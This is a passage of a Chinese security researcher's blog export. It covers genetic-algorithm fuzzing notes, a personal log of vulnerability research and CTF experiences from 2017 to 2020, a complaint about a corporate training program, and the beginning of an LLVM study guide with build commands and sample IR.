<h4 id="0x03-举个栗子"><a href="#0x03-举个栗子" class="headerlink" title="0x03 : 举个栗子"></a>0x03 : 举个栗子</h4><p>例子来自<a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9">getting-started-genetic-algorithms-python-tutorial</a></p>
<h5 id="1-demo简述"><a href="#1-demo简述" class="headerlink" title="1. demo简述"></a>1. demo简述</h5><p>这里创建一个已知长度的密码破解程序 -。- （这不就是暴力破解吗，是的没错，但是思维方式要换一换啦）</p>
<p>我们针对没错输入的字符串（个体）进行评估，得到一个评分（适应环境性），这个评分指示着和正确密码的接近程度。算法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fitness score = (number of char correct) / (total number of char)</span><br></pre></td></tr></table></figure>

<p>随后对输入的串进行变异（进化，进化，进化…），然后对于新一代的群体，进行评分，挑选合适的个体作为第二代，然后从第二代中迭代产生新的个体。</p>
<p>产生下一代的方式也很简单，比如我们有两个个体叫做Tom和Jerry，他们的后代名字的字母就从两者名字字母中取就好了。</p>
<p>经历上述的过程，一代一代的进化，最终一定会得到正确的密码。</p>
<h5 id="2-一点问题"><a href="#2-一点问题" class="headerlink" title="2. 一点问题"></a>2. 一点问题</h5><p>但是问题来了！这也是今天我在看论文时发现的一个问题-。- </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bloating: </span><br><span class="line">Bloating [16] is a phenomenon that adversely affects input generation in evolutionary computing. </span><br><span class="line">There are two types of bloating: structural and functional bloating.</span><br></pre></td></tr></table></figure>

<p>主要分为两类：Structural Bloating和Functional Bloating。</p>
<p>第一种主要是经过多代的迭代后，经过xx代，个体的平均规模不受控制的增长从而导致代码效率下降，后续的增长也无异于提高适应度（适应度，就是例子中的fitness）。</p>
<p>第二种是指在进化过程中，如果只挑选好的样本（高评分），那么你得到的样本会快速收敛在一个范围内，也就是说，你的样本的特征就趋于一个方向。对于我们这个密码破解程序，当然ok啦，但是对于Fuzz的话显然是不行的，我们需要多种多样的样本而不是趋近于某一种类型的样本。</p>
<h5 id="3-代码"><a href="#3-代码" class="headerlink" title="3. 代码"></a>3. 代码</h5><p>原文作者的代码在这里：<br><a href="https://gist.github.com/NicolleLouis/d4f88d5bd566298d4279bcb69934f51d">getting-started-genetic-algorithms-python-tutorial_source_code</a></p>
<p>运行结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 passwordTuto.py</span><br><span class="line">solution: <span class="string">&quot;banana&quot;</span> de fitness: 100.0</span><br><span class="line">18.69589400291443</span><br></pre></td></tr></table></figure>

<p><img src="http://blogimg-10065924.cossh.myqcloud.com/genetic_algorithm/image_GP.png" alt="result"></p>
<h4 id="0x04-一点个人看法"><a href="#0x04-一点个人看法" class="headerlink" title="0x04 : 一点个人看法"></a>0x04 : 一点个人看法</h4><p>我觉得这个算法对于漏洞挖掘，无疑是增强型buff，通过合理的使用，能够有效的提升样本质量，从而提高fuzz的效率。但是文中提到的<code>Bloating</code>的问题，无疑也是需要去考虑然后加以干预的。</p>
<h4 id="0x05-参考及引用"><a href="#0x05-参考及引用" class="headerlink" title="0x05 : 参考及引用"></a>0x05 : 参考及引用</h4><ol>
<li><a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9">getting-started-genetic-algorithms-python-tutorial</a></li>
<li><a href="https://gist.github.com/NicolleLouis/d4f88d5bd566298d4279bcb69934f51d">getting-started-genetic-algorithms-python-tutorial_source_code</a></li>
<li>IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</li>
</ol>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Study</tag>
      </tags>
  </entry>
  <entry>
    <title>Logs</title>
    <url>/2017/01/28/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/</url>
    <content><![CDATA[<p>0x1337</p>
<a id="more"></a>

<h4 id="2017-01-28"><a href="#2017-01-28" class="headerlink" title="2017-01-28"></a>2017-01-28</h4><p>大年初一还在写代码，把以前挖的坑填起来，一直想做的自动化的框架终于有点样子了，先做的能跑起来，然后再做一些优化工作把。想着是像<code>msf</code>那样的，几个功能分成几个模块去做，模块之间独立，然后<code>paylod</code>那些可以随意调用；今天只把<code>exploit</code>部分写了个开头，感觉总想推翻重写…这是病，先做完了再说重构的事情好了 QAQ 。</p>
<p>前几天入坑了<code>Windows Kernel Exploit</code>相关，看到了关于内核内存分配相关的资料的时候，感觉好熟悉，一下想起了之前看到<code>linux glibc</code>堆管理相关的资料了。有种很熟悉的感觉吧，怎么说呢，感觉再看到<code>windows kernel</code>内存管理部分的时候就很容易可以理解这些结构是怎么工作的，上手还是快，不过还是想写写代码调试看看，毕竟<code>纸上得来终觉浅</code>。</p>
<p>说到填坑，感觉好多啊，之前<code>Android Sec</code>相关；<code>LLVM</code>的研究也是处在挂起状态，之前是结合着代码混淆技术去学习的，自己写写pass之类的，还有就是看看<code>OLLVM</code>这个项目；<code>符号执行</code>技术的学习算是迈入正轨吧，<code>Paper</code>也很多。还有就是<code>YouTube</code>上好多不错的这些相关的视频啊 2333333</p>
<p>慢慢来吧，感觉都很有意思，而且越往后研究越有意思呀~</p>
<h4 id="2017-01-29"><a href="#2017-01-29" class="headerlink" title="2017-01-29"></a>2017-01-29</h4><p>框架<code>exploit</code>部分完成啦 -。- 哦豁<br>看<code>Android</code>相关，看到<code>Dalvk</code>虚拟机部分的时候，看到了关于<code>Zygote</code>，就是虚拟机实例孵化器…然而这个单词的意思也是很有趣啊 啊哈哈哈哈哈哈哈，形象生动 233333333333333</p>
<h4 id="2017-01-30"><a href="#2017-01-30" class="headerlink" title="2017-01-30"></a>2017-01-30</h4><p>纠结到底开不开源一些东西 :(</p>
<h4 id="2017-02-04"><a href="#2017-02-04" class="headerlink" title="2017-02-04"></a>2017-02-04</h4><p>浪完了回来开工了 23333<br>想明白了一些事，精力有限，贪多嚼不烂；其次就是关于重视基本功，一味地追求上层建筑是没有意义的，早晚要崩塌。那学习技术来说，想做的很多，但是你能够做好其中一两件已经很不错了，还有就是操作系统这个东西…不去把那些lab刷了感觉还是白学，知行合一吧算是。</p>
<h4 id="2017-02-07"><a href="#2017-02-07" class="headerlink" title="2017-02-07"></a>2017-02-07</h4><p>mdzz啊…编译linux内核然后升级个linux，然后虚拟机就炸了硬盘没挂上…bug<br>尝试一下添加系统调用、驱动的方式来体验一下<code>linux kernel exploit</code> 23333333333</p>
<h4 id="2017-02-11"><a href="#2017-02-11" class="headerlink" title="2017-02-11"></a>2017-02-11</h4><p>把自己的PwnableLog这个repo整合进了一些收集的不错的脚本，稍作改动就可以玩了。啊 winafl对于GUI程序真是尴尬，发送窗口关闭消息或者循环进程检测并杀进程的思路效果都不理想…看来只有二次插桩可以用。</p>
<h4 id="2017-02-17"><a href="#2017-02-17" class="headerlink" title="2017-02-17"></a>2017-02-17</h4><p>框架防御模块基本做起来了…想着先出成品再修bug/优化工作。当初瞎立flag，巧了又有点拖延症，哦豁，have fun咯。</p>
<h4 id="2017-02-28"><a href="#2017-02-28" class="headerlink" title="2017-02-28"></a>2017-02-28</h4><p>挺尴尬很多东西以前没做详细的记录，只有零碎的记录和脚本…总结起来就很蛋疼。<br>最近还是挺开心啊，有了铠甲也有了软肋，感觉多了一个努力的理由咯。</p>
<h4 id="2017-03-01"><a href="#2017-03-01" class="headerlink" title="2017-03-01"></a>2017-03-01</h4><p>一个有情怀的二进制狗。</p>
<h4 id="2017-03-06"><a href="#2017-03-06" class="headerlink" title="2017-03-06"></a>2017-03-06</h4><p>这是假的，那是假的，好像没什么真的了。</p>
<h4 id="2017-03-10"><a href="#2017-03-10" class="headerlink" title="2017-03-10"></a>2017-03-10</h4><p>最近开始看linux kernel相关，底层真的太有趣了~<br>linus insides这个gitbook不错，从boot开始讲，结合着看就很不错，再对应着源码，很爽。</p>
<h4 id="2017-03-13"><a href="#2017-03-13" class="headerlink" title="2017-03-13"></a>2017-03-13</h4><p>肝了两天NJCTF…还是感觉太菜了 QAQ 低分题目做的慢 高分玩不动…<br>挺可惜的reverse400，符号执行脚本都写好了，跑了几次，posixdump的是空值，怕是脚本又写的有问题，路径找到了，就是dump不对，尴尬。<br>pwnable，简单的一些细节处理的不好，很伤，平时的积累啊，多收集libc，多动手搞事情 23333<br>SROP开眼了，又是论文pwn，害怕…不过joker那个exp真的太黑客了，思路666<br>好好学习把~ 比赛真的挺有意思的 XD</p>
<h4 id="2017-03-22"><a href="#2017-03-22" class="headerlink" title="2017-03-22"></a>2017-03-22</h4><p>面试这几次，倍感所学知识面的狭窄，了解的很有限，而且以前掌握的一些东西没有再去看就很容易忘记一些细节(还好还有笔记…)<br>感觉一直在被问移动安全…学习学习。<br>经历一些比赛之后，感觉还有很多漏洞利用的trick…调试的trick，比如获取gs:0x10的值，都有待积累。</p>
<h4 id="2017-03-23"><a href="#2017-03-23" class="headerlink" title="2017-03-23"></a>2017-03-23</h4><p>好多不顺利- -。<br>想要的很简单，可是得到却那么难。</p>
<h4 id="2017-03-27"><a href="#2017-03-27" class="headerlink" title="2017-03-27"></a>2017-03-27</h4><p>重头再来，一切还要继续，我不还是要接着看书学习写代码么。</p>
<h4 id="2017-03-29"><a href="#2017-03-29" class="headerlink" title="2017-03-29"></a>2017-03-29</h4><p>调试分析CVE-2017-7269,发现用capstone还原shellcode挺好用的…虽然还原出来的sc并不好懂…可能是姿势有问题?汇编指令用的很奇怪…还有就是快速定位漏洞点，我想打个CC然后just in time debugger进去栈回溯看，但是效果不理想，啊啊啊 测试别的方法好了。</p>
<h4 id="2017-04-01"><a href="#2017-04-01" class="headerlink" title="2017-04-01"></a>2017-04-01</h4><p>将生活带给你的柠檬版的酸楚，酿成犹如柠檬汽水般的甘甜。<br>已经如此了，再坏也坏不到哪里去了。<br>没有什么后路，也就无所畏惧，大步向前。</p>
<h4 id="2017-05-05"><a href="#2017-05-05" class="headerlink" title="2017-05-05"></a>2017-05-05</h4><p>有时候需要反思以下自己的讲话的方式。可能是这几年接触的最多的是技术相关的朋友，圈子很小，所以大家交流的方式都是那么直接，也很直白，比如说到xxx，就会直接讲，xxx很简单的，你只要看了xxxxx就可以搞定xxxxx然后最后就可以完成xxx。</p>
<p>其实你反思以下，在圈外人看来呢？可能很多人看来是：mdzz 我不懂这些，你还说的有劲。</p>
<p>还有就是方式把，不可能一直生活在这个小圈子，总要接触很多人，所以不要总是以技术宅的思维去交流做事，有时候挺伤人咯-。-  </p>
<p>别人为什么不问你问题，因为你总说：这个太简单了那个太简单了。</p>
<p>层次问题…有些问题在大佬看来很简单，在我看来就很困难…相互理解下就好了  233333</p>
<p>好好学习啦，多看书，修身养性，热爱生活。</p>
<h4 id="2017-05-23"><a href="#2017-05-23" class="headerlink" title="2017-05-23"></a>2017-05-23</h4><p>铁三西南赛区打的挺不错，开心。</p>
<p>近期开始学习编译原理，三大浪漫之一 23333</p>
<p>人无信不足以立，对于这两天发生的事情的感受吧，又不能发火，烦。</p>
<p>1adac很好用，爽，这钱花的值。</p>
<p>还有嘛…有些时候付出不一定要回报，况且有些事情是习惯了-。-</p>
<h4 id="2017-05-30"><a href="#2017-05-30" class="headerlink" title="2017-05-30"></a>2017-05-30</h4><p>孤独感。</p>
<h4 id="2017-06-29"><a href="#2017-06-29" class="headerlink" title="2017-06-29"></a>2017-06-29</h4><p>自说自话的**只不过是给别人平添烦恼罢了。</p>
<h4 id="2017-07-04"><a href="#2017-07-04" class="headerlink" title="2017-07-04"></a>2017-07-04</h4><p>断断续续看完了 CVE-2016-0728的分析，也搭建了环境分析。Linux kernel的UAF挺有意思。<br>还在写使用了NFA构造的词法分析器…cpp拙计 感觉c可以做，但是后期优化出DFA的时候就拙计了。</p>
<h4 id="2017-07-30"><a href="#2017-07-30" class="headerlink" title="2017-07-30"></a>2017-07-30</h4><p>实习。忙着工作的事，挺开心的，做喜欢的事，虽然感觉挺难的，不过有挑战性才更有意思。<br>blog感觉很久不会再去更新了 2333333</p>
<p>昨晚和朋友聊天，被说：比起喜欢，我觉得你更需要人陪。</p>
<p>假的假的。</p>
<h4 id="2017-08-20"><a href="#2017-08-20" class="headerlink" title="2017-08-20"></a>2017-08-20</h4><p>遇到两个不能复现的crash了，很心累。<br>准备重写fuzz框架重新搞事了。</p>
<h4 id="2017-08-24"><a href="#2017-08-24" class="headerlink" title="2017-08-24"></a>2017-08-24</h4><p>解决了之前的bug，又遇到了新的…</p>
<h4 id="2017-09-26"><a href="#2017-09-26" class="headerlink" title="2017-09-26"></a>2017-09-26</h4><p>再接再厉</p>
<h4 id="2017-10-27"><a href="#2017-10-27" class="headerlink" title="2017-10-27"></a>2017-10-27</h4><p>愿此间 山有木兮卿有意<br>昨夜星辰恰似你</p>
<h4 id="2017-12-30"><a href="#2017-12-30" class="headerlink" title="2017-12-30"></a>2017-12-30</h4><p>2017就快过完了，我还在搞着adobe reader。花式空指针，fuzzer还在完善，各种各样的问题，觉得难又觉得不难。<br>思路都很好玩，只是自身能力有限，啃不动。需要时间去积累。</p>
<p>而且就在昨天，发现自己之前漏掉了一个攻击点…简直血亏。 叹息…</p>
<h4 id="2018-2-14"><a href="#2018-2-14" class="headerlink" title="2018-2-14"></a>2018-2-14</h4><p>过不过节感觉没啥区别啊-。-<br>《自制编译器》真的是一本不可多得的好书。终于看到IR生成部分了，先把公开课关于中间代码生成的部分搞定了，再去看这本书这部分的内容，然后再去看它的代码。</p>
<p>有几天没去搞工作上的事了，只是看看paper和slide，感觉好咸鱼啊。 :(</p>
<p>最后，高老师节日快乐-。-</p>
<h4 id="2018-2-28"><a href="#2018-2-28" class="headerlink" title="2018-2-28"></a>2018-2-28</h4><p>快要去学校了。<br>工作有点进展了，还在看grinder源码，要改造，long way to go</p>
<p>编译原理学习中。</p>
<h4 id="2018-4-29"><a href="#2018-4-29" class="headerlink" title="2018-4-29"></a>2018-4-29</h4><p>真的想吐槽。<br>最近比赛什么玩意。</p>
<h4 id="2018-6-9"><a href="#2018-6-9" class="headerlink" title="2018-6-9"></a>2018-6-9</h4><p>阅读paper，阅读源码，学习别人的思路。<br>好好看书，想拿antlr4搞大事。</p>
<h4 id="2018-8-13"><a href="#2018-8-13" class="headerlink" title="2018-8-13"></a>2018-8-13</h4><p>本来工作的第一个月开开心心，学东西也看心，爽的一批。<br>但是八月份飞扬一开始，就TM负能量爆棚。 辣鸡飞扬，劝退系列，洗脑特么失败了。<br>看看某司、某司、某司…哪家像你们这么搞人？<br>耽误正常工作好吧，浪费时间好吧。</p>
<h4 id="2018-11-10"><a href="#2018-11-10" class="headerlink" title="2018-11-10"></a>2018-11-10</h4><p>关于code coverage，对格式类fuzz很有意义，但是语法、脚本引擎这种靠逻辑的东西，意义似乎没那么大。<br>工作的蛮开心，压力动力并存，希望自己能扛过去，完成蜕变。</p>
<h4 id="2018-11-26"><a href="#2018-11-26" class="headerlink" title="2018-11-26"></a>2018-11-26</h4><p>天府杯结束，继续努力。<br>给自己开了两个大坑，一个是关于文件格式，一个关于代码生成，随便一个都要做好久…更别提还有很多漏洞需要分析，短期内应该不会提交漏洞了。</p>
<h4 id="2018-12-2"><a href="#2018-12-2" class="headerlink" title="2018-12-2"></a>2018-12-2</h4><p>调了一天洞，感觉猜想是正确的，但是调试下来就不对…真奇怪啊。<br>又要从零开始疯狂搞挖掘了… 希望有点产出</p>
<h4 id="2018-12-6"><a href="#2018-12-6" class="headerlink" title="2018-12-6"></a>2018-12-6</h4><p>每次和男哥聊，都感叹他思考问题的高度和角度，感觉自己思考问题很局限性，而且只看到眼前，没有做更多的、更长远的考虑:(<br>too young啊还是</p>
<h4 id="2018-12-21"><a href="#2018-12-21" class="headerlink" title="2018-12-21"></a>2018-12-21</h4><p>又病倒了，嗓子发炎了，喝水喝了好多… ddl在逼近，一定要抗住压力前进。</p>
<p>非工作时间的小计划也在一点点进行，看书学习什么的，加油。</p>
<p>努力程度真的还没到拼天赋那一步吧。</p>
<h4 id="2018-12-25"><a href="#2018-12-25" class="headerlink" title="2018-12-25"></a>2018-12-25</h4><p>圣诞节快乐，这几天的病终于好转了一点点，想起周六在医院挂不上号、急诊等不到的场景，<br>那一刻真的很想逃离北京。<br>好消息是，因为生病，好像只睡了六小时也没什么问题，多的时间拿来看书了…<br>逆向上终于有更好的进展了，我感觉有0day在等我了，加油。</p>
<h4 id="2018-12-28"><a href="#2018-12-28" class="headerlink" title="2018-12-28"></a>2018-12-28</h4><ol>
<li>github开了个仓库，放自己挖到的洞poc以及一些收集到的poc，可能会跟上分析。</li>
<li>感叹，可能reader的代码真的太老了吧。。</li>
<li>遇到了奇葩的内存断点断不下来的情况，还没法解决。。心累</li>
</ol>
<h4 id="2018-12-31"><a href="#2018-12-31" class="headerlink" title="2018-12-31"></a>2018-12-31</h4><p>普通的一天，把自己的mbp擦的干干净净，新年新气象了。</p>
<p>新的一年，希望：</p>
<ol>
<li>挖到更多的洞，RCE；</li>
<li>自己的非工作时间的Rock Lee计划顺利执行，并且能有成效；</li>
<li>学到更多东西，在非舒适区成长。</li>
</ol>
<h4 id="2019-2-1"><a href="#2019-2-1" class="headerlink" title="2019-2-1"></a>2019-2-1</h4><p>要回家了。</p>
<p>刚开始半年工作干的还不错，也有很多收获。</p>
<p>工作压力大，但是动力更大；最近搞定了一些问题，新的思路也得以实践，一切都不错。。</p>
<p>不过还有很多事没做啊，新fuzz框架的规范化，平台编写，与之相关的一些东西还没写完呢。。</p>
<p>继续加油，争取出更多的0day吧  :)</p>
<h4 id="2019-2-3"><a href="#2019-2-3" class="headerlink" title="2019-2-3"></a>2019-2-3</h4><p>fuzz跑的还算稳定，需要接入更多的东西，想办法搞的通用一点，现在还是需要太多人为干预了；</p>
<p>今天都二十九了，还是写了点代码，做了一个poc db，把收集到的文件，按照不同的格式，做好分类，</p>
<p>方便日后fuzz使用。 这样的话，还需要写爬虫了，爬很多的样本下来…</p>
<h4 id="2019-4-27"><a href="#2019-4-27" class="headerlink" title="2019-4-27"></a>2019-4-27</h4><p>再来一个信息泄漏就可以一套利用了，加油。</p>
<p>最近顺便把之前做的winafl通用模式fuzz封装起来，弄成类似libfuzzer的那种模式，提供函数，buffer，length，<br>就可以直接fuzz ：） 加油咯。</p>
<h4 id="2019-5-19"><a href="#2019-5-19" class="headerlink" title="2019-5-19"></a>2019-5-19</h4><p>调洞的样子真像cxk :( </p>
<p>大改了fuzzer，等一波输出了。</p>
<p>尝试新的挖洞思路中…</p>
<h4 id="2019-8-7"><a href="#2019-8-7" class="headerlink" title="2019-8-7"></a>2019-8-7</h4><p>差不多尝试了两个月，没什么有用的产出，现有的都很鸡肋。 </p>
<p>关键的问题：基本功。</p>
<h4 id="2019-11-17"><a href="#2019-11-17" class="headerlink" title="2019-11-17"></a>2019-11-17</h4><p><a href="https://gist.githubusercontent.com/knightsc/10810d5a0a51d6cdd79daeda99e66daa/raw/240ba8094f0505de0ef2c9af8477c6d25b5f62a3/build-xnu-4903.221.2.sh">xnu_build.sh</a>真香</p>
<p>换了个路线了…</p>
<h4 id="2019-11-23"><a href="#2019-11-23" class="headerlink" title="2019-11-23"></a>2019-11-23</h4><p>似乎之前过的太安逸了 :(</p>
<h4 id="2020-6-21"><a href="#2020-6-21" class="headerlink" title="2020-6-21"></a>2020-6-21</h4><p>:) </p>
<p>找找节奏 gogogo</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>飞扬历险记</title>
    <url>/2018/08/13/%E9%A3%9E%E6%89%AC%E5%8E%86%E9%99%A9%E8%AE%B0/</url>
    <content><![CDATA[<p>本故事纯属虚构，如有雷同，那就雷同吧。</p>
<a id="more"></a>

<ol>
<li><p>飞之前，工作地十分开心，能感受到自己每天在进步，反正就是工作的很开心。</p>
</li>
<li><p>自从八月六号之后，一切都变了，我开始变得负能量爆棚，骂街的频率也陡然升高。</p>
</li>
<li><p>每天9点多到，晚上不知道几点才能走，最早的一次十一点四十，最晚的一次凌晨两点多。布置那么多东西，像幼儿园小朋友一样的活动，真的是没啥意义。</p>
</li>
<li><p>半个月的时间，耽误了很多工作，再次回到工作中，有些不适应吧，花了点时间去同步、适应，太蠢了这个东西。</p>
</li>
<li><p>让我情绪比较爆发的还是后几天中，一个妹子的事，过敏+上呼吸道感染，请假居然不允许，还强行让人家去脱口秀讲话，之后还说不合格，后天再来。真的是牛逼到不行。 你们是真的都不会生病，铁人，很厉害，希望你们生病的时候也能坚持坚持再坚持。</p>
</li>
<li><p>后面还发生了用手掂起人家电脑屏幕，摔的那种方式合上并收走的事，作为一个IT🐶，这个真的不能忍，问候一下他全家。</p>
</li>
<li><p>挺搞笑的一件事，实习生刚来就半个月这么陪着一起熬，最后一天结束的时候，领导说几句“感人”的话…兄弟，现实点，加班费。</p>
</li>
</ol>
<p>最后，真的很无聊，<strong>自助难吃的一批</strong>。</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM Study Log</title>
    <url>/2017/02/27/LLVM-Study-Log/</url>
    <content><![CDATA[<h4 id="0x0-简述"><a href="#0x0-简述" class="headerlink" title="0x0. 简述"></a>0x0. 简述</h4><p>刚接触LLVM的时候的记录，算是笔记吧，想从代码混淆的思路学习，学习如何写Pass，以及把自己写的Pass应用到实际的程序中。<br>学习笔记更新中…</p>
<a id="more"></a>

<h4 id="0x1-LLVM"><a href="#0x1-LLVM" class="headerlink" title="0x1. LLVM"></a>0x1. LLVM</h4><h5 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h5><p>LLVM是一个编译器框架，LLVM框架提供的中间表示（IR），可以作为多种语言的后端，并且根据IR可以做语言无关的优化以及<br>生成对应各种构架（x86,amd64,arm等）的代码。</p>
<p>主要分为三个部分：前端、Pass、后端</p>
<ul>
<li>  前端： 获取源码，转成IR。</li>
<li>  Pass：做各种优化工作或者一些过程的变换工作。</li>
<li>  后端： 生成对应平台的机器码。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Source Code ----&gt; Frontend ----&gt; Optimizer ----&gt; Backend ----&gt; Machine Code</span><br><span class="line">                                    |</span><br><span class="line">                                Pass Work Here</span><br></pre></td></tr></table></figure>

<p>更多细节直接看<a href="http://llvm.org/">官网</a></p>
<h5 id="1-2-安装"><a href="#1-2-安装" class="headerlink" title="1.2 安装"></a>1.2 安装</h5><p>安装的话直接按照官方的文档去安装就可以了.</p>
<p>下载源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd where-you-want-llvm-to-live</span><br><span class="line">$ svn co http:&#x2F;&#x2F;llvm.org&#x2F;svn&#x2F;llvm-project&#x2F;llvm&#x2F;trunk llvm</span><br><span class="line">$ cd where-you-want-llvm-to-live</span><br></pre></td></tr></table></figure>
<p>迁移出clang</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd llvm&#x2F;tools</span><br><span class="line">$ svn co http:&#x2F;&#x2F;llvm.org&#x2F;svn&#x2F;llvm-project&#x2F;cfe&#x2F;trunk clang</span><br></pre></td></tr></table></figure>

<p>运行库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd where-you-want-llvm-to-live</span><br><span class="line">$ cd llvm&#x2F;projects</span><br><span class="line">$ svn co http:&#x2F;&#x2F;llvm.org&#x2F;svn&#x2F;llvm-project&#x2F;compiler-rt&#x2F;trunk compiler-rt</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir build</span><br><span class="line">$ cd build</span><br><span class="line">$ cmake -DCMAKE_BUILD_TYPE:String&#x3D;Release ..&#x2F;llvm&#x2F;</span><br><span class="line">$ make -j x</span><br></pre></td></tr></table></figure>


<p>就是最后编译的时候，时间会比较久，<code>make -j x </code>，x给的大一点<br>会编译的快一点。</p>
<h5 id="1-3-IR"><a href="#1-3-IR" class="headerlink" title="1.3 IR"></a>1.3 IR</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LLVM IR有三种形式，可读的文本形式(.ll)，硬盘上存储的二进制形式(.bc)，内存中的编译器检测和修改的形式。</span><br></pre></td></tr></table></figure>

<p>下面编写测试代码，来看一下IR语言。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">    c = test(<span class="number">4</span>,<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I got : %d \n&quot;</span>,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译<code>clang -emit-llvm test.cpp -S -o test.ll</code><br>得到IR</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;test.cpp&#39;</span><br><span class="line">source_filename &#x3D; &quot;test.cpp&quot;</span><br><span class="line">target datalayout &#x3D; &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str &#x3D; private unnamed_addr constant [13 x i8] c&quot;I got : %d \0A\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind uwtable</span><br><span class="line">define i32 @_Z4testii(i32, i32) #0 &#123;</span><br><span class="line">  %3 &#x3D; alloca i32, align 4</span><br><span class="line">  %4 &#x3D; alloca i32, align 4</span><br><span class="line">  store i32 %0, i32* %3, align 4</span><br><span class="line">  store i32 %1, i32* %4, align 4</span><br><span class="line">  %5 &#x3D; load i32, i32* %3, align 4</span><br><span class="line">  %6 &#x3D; load i32, i32* %4, align 4</span><br><span class="line">  %7 &#x3D; add nsw i32 %5, %6</span><br><span class="line">  ret i32 %7</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline norecurse uwtable</span><br><span class="line">define i32 @main(i32, i8**) #1 &#123;</span><br><span class="line">  %3 &#x3D; alloca i32, align 4</span><br><span class="line">  %4 &#x3D; alloca i32, align 4</span><br><span class="line">  %5 &#x3D; alloca i8**, align 8</span><br><span class="line">  %6 &#x3D; alloca i32, align 4</span><br><span class="line">  store i32 0, i32* %3, align 4</span><br><span class="line">  store i32 %0, i32* %4, align 4</span><br><span class="line">  store i8** %1, i8*** %5, align 8</span><br><span class="line">  store i32 0, i32* %6, align 4</span><br><span class="line">  %7 &#x3D; call i32 @_Z4testii(i32 4, i32 6)</span><br><span class="line">  store i32 %7, i32* %6, align 4</span><br><span class="line">  %8 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">  %9 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0), i32 %8)</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i32 @printf(i8*, ...) #2</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; noinline nounwind uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; noinline norecurse uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; 